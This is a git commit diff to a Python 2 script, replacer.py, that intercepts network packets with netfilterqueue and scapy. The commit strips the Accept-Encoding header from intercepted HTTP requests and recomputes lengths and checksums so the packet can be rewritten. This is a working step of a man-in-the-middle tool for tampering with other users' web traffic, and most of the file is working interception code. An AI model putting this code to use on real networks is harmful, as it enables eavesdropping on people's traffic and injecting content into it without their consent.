a6a17a1e357787a8d7f5c74e4e6fbae4320902cb
p37 <gh0stsync.rt@gmail.com>
2018-07-27 00:12:21 -0700

    add http decode and debug

--- replacer.py
+++ replacer.py
@@ -2,16 +2,24 @@
 
 import netfilterqueue
 import scapy.all as scapy
+import re
 
 
-
+def set_load(packet,load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             print "[+] Request"
-            print scapy_packet.show()
+            modify_load = re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
+            new_packet = set_load(scapy_packet,modify_load)
+            packet.set_payload(str(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print "[+] Response"
             print scapy_packet.show()
